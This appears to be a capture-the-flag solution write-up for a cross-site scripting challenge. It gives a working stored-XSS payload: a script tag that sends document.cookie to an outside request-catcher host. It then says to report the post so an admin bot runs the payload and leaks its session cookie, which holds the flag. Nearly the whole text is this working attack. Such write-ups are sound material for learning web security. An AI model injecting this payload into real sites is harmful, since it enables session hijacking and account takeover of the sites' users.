# Solution

This challenge is an XSS attack. The goal is to inject a script that will steal the cookie of the admin bot (flag is in the cookies).

The user should create a new post with the following content:

```html
<script>document.location="https://marios.requestcatcher.com/?cookie="+document.cookie</script>
```

Then the user should report the post to the admin bot. When the admin bot views the post, the script will execute and send the cookies to the attacker's server. 
